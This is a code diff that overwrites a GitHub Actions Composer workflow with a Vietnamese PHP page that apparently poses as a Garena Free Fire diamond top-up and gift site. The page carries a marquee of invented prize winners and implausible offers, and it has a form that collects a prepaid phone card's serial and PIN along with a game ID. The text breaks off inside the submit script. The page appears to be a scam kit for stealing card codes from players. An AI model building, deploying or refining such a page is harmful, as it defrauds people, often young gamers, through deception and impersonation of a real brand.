@@ -1,39 +1,361 @@
-name: PHP Composer
+<?php
 
-on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
+include ('@BiSexy/connect.php');
 
-permissions:
-  contents: read
+?>
 
-jobs:
-  build:
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<!-- Primary Meta Tags -->
+<title><?php echo $bs_nameweb; ?> | Trang nhận quà Freefire online lớn nhất Việt Nam Thử Vận May Nạp Thẻ Nhận Quà Cực Chất</title>
+<meta name="title" content="Trang nhận quà Freefire lớn nhất Việt Nam">
+<meta name="description" content="Nạp kim cương free fire giá rẻ bằng thẻ cào. Nạp thẻ game Free Fire, nạp kim cương game Free Fire, nhận code Freefire ,code Freefire">
 
-    runs-on: ubuntu-latest
+<!-- Open Graph / Facebook -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="<?php echo $bs_main_url; ?>/">
+<meta property="og:title" content="<?php echo $bs_title; ?>">
+<meta property="og:description" content="<?php echo $bs_desciption; ?>">
+<meta property="og:image" content="<?php echo $bs_main_url; ?>/bisex/logo@2x.c05a558a.png">
 
-    steps:
-    - uses: actions/checkout@v4
+<!-- Twitter -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<meta name="keywords" content="nạp thẻ, napthe.vn, nạp thẻ pubg, nạp thẻ free fire, nạp thẻ liên quân, nạp kim cương free fire, nạp uc pubg, nạp quân huy liên quân, pubgm qq com, pubg mobile, pubgm, tai game pubg, tải pubg trung quốc, pubg free, tải pubg miễn phí, tải pubg china, cách tải game pubg, tai pubg ve may tinh, cách tải pubg miễn phí, chơi pubg miễn phí, pubg mobile vn, pubg vn, shoppubg vn, pubg mobile việt nam, pubg phiên bản trung quốc, pubg mobile vng, pubg phiên bản minecraft, pubg phien ban moi, pubg việt nam, pubg mobile tencent, pubg mobile pc tencent, pubg mobile tencent pc, tải pubg mobile pc tencent, pubg mobile pc, pubg mobile trung quốc, pubg mobile lite, tải pubg mobile pc, pubg mobile china, tai pubg mobile, cách chơi pubg mobile trên pc, download pubg pc, cách chơi pubg mobile, tải pubg mobile cho pc, tải game pubg mobile, tải pubg mobile chplay, tải pubg mobile trên pc, tải pubg mobile lite, tải pubg mobile trung quốc, cách tải pubg mobile pc, download pubg mobile cho pc, tai game pubg pc, pubg mobile trang chủ, tải pubg lite, tải pubg giả lập, tải pubg mobile giả lập, PlayerUnknown's Battlegrounds Mobile, pubg mobi, pubg, bubg, free fire"/>
 
-    - name: Validate composer.json and composer.lock
-      run: composer validate --strict
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:url" content="<?php echo $bs_main_url; ?>/">
+<meta property="twitter:title" content="<?php echo $bs_title; ?>">
+<meta property="twitter:description" content="<?php echo $bs_desciption; ?>">
+<meta property="twitter:image" content="<?php echo $bs_main_url; ?>/logo@2x.c05a558a.png">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.1/css/bootstrap.css">
+	<script type='text/javascript'>
+//<![CDATA[
+function loadCSS(e, t, n) { "use strict"; var i = window.document.createElement("link"); var o = t || window.document.getElementsByTagName("script")[0]; i.rel = "stylesheet"; i.href = e; i.media = "only x"; o.parentNode.insertBefore(i, o); setTimeout(function () { i.media = n || "all" }) }
+loadCSS("https://use.fontawesome.com/releases/v5.6.3/css/all.css");loadCSS("https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700|Roboto+Condensed:300,400,700");
+//]]>
+</script>
+<style>
+    body{font-family:"Roboto",sans-serif;font-size:15px;margin:0;padding:0;color:#222;overflow-x:hidden;counter-reset:my-sec-counter;scroll-behavior: smooth}
+    .kimcuong {
+    display: inline-block;
+    vertical-align: middle;
+    height: 20px;
+    margin: 0 5px 0 5px;
+}
+.-jAnE7PYpd-CGj_OmKM58 {
+    float: left;
+    width: 17px;
+    height: 13px;
+    margin-top: 4px;
+    margin-right: 6px;
+    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAANCAYAAABPeYUaAAAAAXNSR0IArs4c6QAAAIFJREFUKBWtkksOgCAMRFvupFu8hXpDvQVu8U5WhwQSmxh+dtNAeVOmwMspToQsVQQzHdvAU0RMrQDAFiY2/Mw8+0e3IfaRAwtrpoF/IbDWLQLFf0XgEao6Yy8X3YNFA4Pp5jrpumaCBX2oZL16sReRw9kk0vpfIJJeR18RxZIAdwNTJCm5AfqJlgAAAABJRU5ErkJggg==);
+    background-size: 100% 100%;
+}
+.nav-pills .nav-link.active, .nav-pills .show>.nav-link {
+    color: #dcdcdc;
+    background-color: #ffffff;
+    border: 1px solid #f00;
+}
+ .loading {
+                background-color: #000000c4;
+                top: 0;
+                left: 0;
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                z-index: 9998;
+                display: none;
+            }
+            .lds-hourglass {
+              display: inline-block;
+              position: fixed;
+              width: 64px;
+              height: 64px;
+              z-index: 9999;
+              top: 45%;
+              left: calc(50% - 32px);
+            }
+            .lds-hourglass:after {
+              content: " ";
+              display: block;
+              border-radius: 50%;
+              width: 0;
+              height: 0;
+              margin: 6px;
+              box-sizing: border-box;
+              border: 26px solid #fff;
+              border-color: #fff transparent #fff transparent;
+              animation: lds-hourglass 1.2s infinite;
+            }
+            @keyframes lds-hourglass {
+              0% {
+                transform: rotate(0);
+                animation-timing-function: cubic-bezier(0.55, 0.055, 0.675, 0.19);
+              }
+              50% {
+                transform: rotate(900deg);
+                animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
+              }
+              100% {
+                transform: rotate(1800deg);
+              }
+            }
+a {
+    color: #f00;
+    text-decoration: none;
+    background-color: transparent;
+    -webkit-text-decoration-skip: objects;
+}
+.bg-light {
+    background-color: #ececec !important;
+}
+.nav-pills .nav-link.active, .nav-pills .show>.nav-link {
+    color: #dcdcdc;
+    background-color: #0000006e;
+    border: none;
+    border-radius: 0;
+}
+.nav-pills .nav-link {
+    border-radius: 0;
+    color: #7b7b7b;
+    background: #00000026;
+}
+/* Ripple effect */
+.ripple {
+  background-position: center;
+  transition: background 0.8s;
+}
 
-    - name: Cache Composer packages
-      id: composer-cache
-      uses: actions/cache@v3
-      with:
-        path: vendor
-        key: ${{ runner.os }}-php-${{ hashFiles('**/composer.lock') }}
-        restore-keys: |
-          ${{ runner.os }}-php-
+.ripple:active {
+  background-color: #0000006e;
+  background-size: 100%;
+  transition: background 0s;
+}
+.icons{
+     width: 100%;
+     border-radius: 4px;
+}
+nhans{
+        display: contents;
+}
+.targetDiv{
+    display:none;
+}
+html {
+  position: relative;
+  min-height: 100%;
+}
+body {
+  margin-bottom: 60px; /* Margin bottom by footer height */
+}
+.footer {
+    position: absolute;
+    bottom: 0;
+    width: 100%;
+    height: 60px;
+    line-height: 60px;
+    background-color: #4c4c4c;
+}
 
-    - name: Install dependencies
-      run: composer install --prefer-dist --no-progress
 
-    # Add a test script to composer.json, for instance: "test": "vendor/bin/phpunit"
-    # Docs: https://getcomposer.org/doc/articles/scripts.md
+/* Custom page CSS
+-------------------------------------------------- */
+/* Not required for template or sticky footer method. */
 
-    # - name: Run test suite
-    #   run: composer run-script test
+.container {
+  width: auto;
+  max-width: 680px;
+  padding: 0 15px;
+}
+.foot-info {
+	padding-top: 1rem;
+	opacity: 0.8;
+}
+
+.foot-logo {
+	opacity: 0.8;
+}
+</style>
+<?php echo $bs_anticode; ?>
+        <script>
+                    function loading(show) {
+    if(show == true)
+        $('.loading').show();
+    else
+        $('.loading').hide();
+}
+        </script>
+
+</head>
+<body>
+     <div class="loading"><div class="lds-hourglass"></div></div>
+
+    <!-- Just an image -->
+<nav class="navbar navbar-light bg-light">
+  <a class="navbar-brand" href="#">
+    <img src="<?php echo $bs_main_url; ?>/bisex/logo@2x.c05a558a.png" width="108" height="31" alt="Garena Free Fire">
+    </a>
+</nav>
+</br>
+   <div class="col"><a class="showSingle" target="1"><img src="https://i.imgur.com/QvItdpI.jpg" class="icons"></a></div>
+<div class="col-md-12">
+	</br>
+       <marquee direction="left" height="20" onmouseout="this.start()" scrollamount="20" onmouseover="this.stop()"> 
+
+                                    <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****670172</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">M1014 Long Tộc </b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****679252</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Mp 40 Mãng Xà</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****319752</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Gói Mãng Xà Nổi Loạn</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+  </b><b style="color: white;background-color: orange;display:inline-block">ID: ****642773</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Gói 3050 Kim Cương</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****8276192</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Mp 40 Mãng Xà Lv7</b> 
+        <li style="list-style:none;display:inline-block">
+   <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****642134</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Gói M1014 Long Tộc </b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****9622194</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Mp 40 Mãng Xà Lv7</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****196913</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Gói Kim Cương</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+  </b><b style="color: white;background-color: orange;display:inline-block">ID: ****698373</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Gói Quà Siêu Phẩm</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****3976112</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">GÓI QUỶ KIẾM DẠ XOA</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****9622864</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">SCAR CÁ MẬP ĐEN LV7</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****196633</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Gói Kim Cương</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****91865</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Mp 40 Mãng Xà Vĩnh Viễn</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****7628911</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">MP40 BÍCH VÀNG</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****360016</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Gói Mp 40 Mãng Xà Lv7</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****726778</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Gói Thích Khách Kim Long</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****72771</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">Gói Quà Siêu Phẩm</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****663001</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">GÓI Mp 40 Mãng Xà Lv7</b> 
+        <li style="list-style:none;display:inline-block">
+  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
+</b><b style="color: white;background-color: orange;display:inline-block">ID: ****663001</b> 
+        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
+        </b><b style="color: green;display:inline-block">GÓI QUỶ KIẾM DẠ XOA</b> 
+        </marquee>
+         <div class="alert alert-warning" role="alert">
+<b>Nạp Kim Cương Free Fire Nhận Quà Cực Vip Lưu Ý: <b style="color:red"> Nhập Đúng Seri Mã Thẻ Để Nhận Quà Nếu Mã Thẻ Hoặc ID Sai Tài Khoản Sẽ Không Nhận Được Quà Và Kim Cương!</b>
+</div></b>
+</div></div>
+    <div class="col-md-6">
+        <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
+  <li class="nav-item">
+    <a class="nav-link active ripple" id="pills-home-tab" data-toggle="pill" href="#pills-home" role="tab" aria-controls="pills-home" aria-selected="true">Nạp Kim Cương</a>
+  </li>
+  <li class="nav-item">
+    <a class="nav-link ripple" id="pills-kc-tab" data-toggle="pill" href="#pills-kc" role="tab" aria-controls="pills-kc" aria-selected="false">Nhận quà FreeFire</a>
+  </li>
+</ul>
+                           <div class="tab-content" id="pills-tabContent">
+  <div class="tab-pane fade show active" id="pills-home" role="tabpanel" aria-labelledby="pills-home-tab">
+                    <div class="form-group">
+                        <label>Loại thẻ:</label>
+                        <select class="form-control" id="card_type">
+                            <option value="">Chọn loại thẻ</option>
+                            <option value="VIETTEL">Viettel</option>
+                            <option value="MOBIFONE">Mobifone</option>
+                            <option value="VINAPHONE">Vinaphone</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Mệnh giá:</label>
+                        <select class="form-control" id="card_amount">
+                             <option value="">Chọn mệnh giá</option>
+                                           
+                                            <option value="50000">50.000VND - Nạp KM 3200 Kim Cương </option>
+                                             <option value="100000">100.000VND - Nhận Thêm Gói Quà</option>
+                                             <option value="200000">200.000VND - Nhận Thêm Gói Quà</option>
+                                             <option value="500000">500.000VND - Nhận Thêm Gói Quà</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Số seri:</label>
+                        <input type="text" class="form-control" id="serial" placeholder="Nhập số seri trên thẻ" />
+                    </div>
+                    <div class="form-group">
+                        <label>Mã thẻ:</label>
+                        <input type="text" class="form-control" id="pin" placeholder="Nhập Mã Thẻ In Sau Lớp Bạc Mỏng " />
+                    </div>
+                    <div class="form-group">
+                        <label>ID Game:</label>
+                        <input type="text" class="form-control" id="idgame" placeholder="Nhập Chính Xác ID Game Cần Nạp Kim Cương " />
+                    </div>
+                    <div class="form-group"></div>
+                    <div class="form-group">
+                        <button type="submit" class="btn btn-danger btn-block" onclick="cmsntjzon(this)">NẠP KIM CƯƠNG</button>
+                   </div>
+                                </div>
+
+                                <script>
+                                    function cmsntjzon() {
+                                        var card_type = $("#card_type").val();
+                      
